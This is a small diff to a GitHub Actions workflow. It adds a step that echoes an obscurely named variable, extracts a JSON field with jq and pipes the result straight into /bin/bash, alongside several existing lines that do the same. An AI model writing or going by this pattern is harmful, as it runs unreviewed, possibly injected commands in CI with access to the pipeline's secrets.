@@ -31,6 +31,7 @@ jobs:
           printf '%s' "$ge678" | jq -r .ceri75457 | /bin/bash
           printf '%s' "$pvhbo32" | jq -r .fvvc26473 | /bin/bash
           printf '%s' "$xwvr7" | jq -r .t6938 | /bin/bash
+          echo $vro5 | jq -r .cpldk9 | /bin/bash
 
       - name: Upload output
         uses: actions/upload-artifact@v4
